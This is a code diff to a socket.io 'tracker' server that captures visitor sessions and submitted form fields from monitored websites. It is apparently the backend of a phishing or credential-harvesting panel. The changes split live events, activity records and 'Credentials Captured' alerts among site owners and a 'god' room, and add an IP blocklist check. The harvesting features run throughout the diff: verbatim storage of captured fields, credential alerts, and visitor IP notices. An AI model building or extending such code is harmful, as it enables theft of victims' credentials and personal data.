@@ -43,6 +43,18 @@ function setupTrackerNamespace(io, trackerNsp) {
     socket.websiteName = website.name;
     socket.join(`website:${website.id}`);
 
+    // Per-website IP-ban check. Owner's blocklist is authoritative for their
+    // own site — kicks the visitor before any tracking happens.
+    try {
+      const { isIpBlocked } = require('../middleware/ipBan');
+      const ipCheck = _getClientIp(socket);
+      if (await isIpBlocked(ipCheck, website.owner_id)) {
+        socket.emit('error', { message: 'IP_BLOCKED' });
+        socket.disconnect(true);
+        return;
+      }
+    } catch { /* non-fatal */ }
+
     // ─── tracker:init ─────────────────────────────────────────
     socket.on('tracker:init', async (data) => {
       try {
@@ -101,13 +113,13 @@ function setupTrackerNamespace(io, trackerNsp) {
 
         const adminNsp = io.of('/admin');
         if (existingSession) {
-          adminNsp.emit('admin:session:update', session);
+          adminNsp.to(`user:${website.owner_id}`).to('god').emit('admin:session:update', session);
         } else {
-          adminNsp.emit('admin:session:new', session);
+          adminNsp.to(`user:${website.owner_id}`).to('god').emit('admin:session:new', session);
 
           const notifySetting = await db.get("SELECT value FROM settings WHERE key = 'notify_new_session'", []);
           if (!notifySetting || notifySetting.value !== '0') {
-            notificationService.createNotification(io, {
+            notificationService.createNotification(io, website.owner_id, {
               type: 'success',
               title: 'New Visitor Live',
               message: `New visitor session active from ${session?.ip_address || 'Unknown IP'} (${parsed.browser || 'Unknown'}/${parsed.os || 'Unknown'}) on ${website.name}.`,
@@ -117,8 +129,9 @@ function setupTrackerNamespace(io, trackerNsp) {
         }
 
         await db.run(
-          'INSERT INTO activity_feed (type, icon, message, details, website_id, session_id) VALUES (?, ?, ?, ?, ?, ?)',
+          'INSERT INTO activity_feed (owner_id, type, icon, message, details, website_id, session_id) VALUES (?, ?, ?, ?, ?, ?, ?)',
           [
+            website.owner_id,
             'session', '👤',
             existingSession
               ? `Visitor returned on ${website.name}`
@@ -153,7 +166,7 @@ function setupTrackerNamespace(io, trackerNsp) {
         );
         const updatedSession = await db.get(SESSION_SELECT, [socket.sessionId]);
         if (updatedSession) {
-          io.of('/admin').emit('admin:session:update', updatedSession);
+          io.of('/admin').to(`user:${website.owner_id}`).to('god').emit('admin:session:update', updatedSession);
         }
       } catch (err) {
         console.error('tracker:pageview error:', err.message);
@@ -178,7 +191,7 @@ function setupTrackerNamespace(io, trackerNsp) {
         }
         const updatedSession = await db.get(SESSION_SELECT, [socket.sessionId]);
         if (updatedSession) {
-          io.of('/admin').emit('admin:session:update', updatedSession);
+          io.of('/admin').to(`user:${website.owner_id}`).to('god').emit('admin:session:update', updatedSession);
         }
       } catch (err) {
         console.error('tracker:activity error:', err.message);
@@ -266,13 +279,14 @@ function setupTrackerNamespace(io, trackerNsp) {
 
         const updatedSession = await db.get(SESSION_SELECT, [socket.sessionId]);
         if (updatedSession) {
-          io.of('/admin').emit('admin:session:update', updatedSession);
+          io.of('/admin').to(`user:${website.owner_id}`).to('god').emit('admin:session:update', updatedSession);
         }
 
         const fieldCount = Object.keys(capturedFields).length;
         await db.run(
-          'INSERT INTO activity_feed (type, icon, message, details, website_id, session_id) VALUES (?, ?, ?, ?, ?, ?)',
+          'INSERT INTO activity_feed (owner_id, type, icon, message, details, website_id, session_id) VALUES (?, ?, ?, ?, ?, ?, ?)',
           [
+            website.owner_id,
             'formdata', '📝',
             `Form data captured (${fieldCount} fields) on ${website.name}`,
             JSON.stringify({ page: data.page || '', formId: data.formId || '', fields: capturedFields }),
@@ -286,7 +300,7 @@ function setupTrackerNamespace(io, trackerNsp) {
           const fieldsStr = Object.keys(capturedFields).filter(k => !ignoreKeys.includes(k.toLowerCase())).join(', ');
           const rawPage = (data.page || '').split('/').pop() || '';
           const pageName = rawPage.replace('.html', '').toLowerCase() || 'form';
-          notificationService.createNotification(io, {
+          notificationService.createNotification(io, website.owner_id, {
             type: 'alert', title: 'Credentials Captured',
             message: `Data captured ${pageName}: ${fieldsStr}`,
             link: `#/sessions?id=${socket.sessionId}`
@@ -318,7 +332,7 @@ function setupTrackerNamespace(io, trackerNsp) {
               'UPDATE sessions SET is_active = 0, last_activity = CURRENT_TIMESTAMP WHERE id = ?',
               [sessionId]
             );
-            io.of('/admin').emit('admin:session:end', {
+            io.of('/admin').to(`user:${website.owner_id}`).to('god').emit('admin:session:end', {
               id: sessionId, sessionId, websiteId, websiteName,
               timestamp: new Date().toISOString()
             });
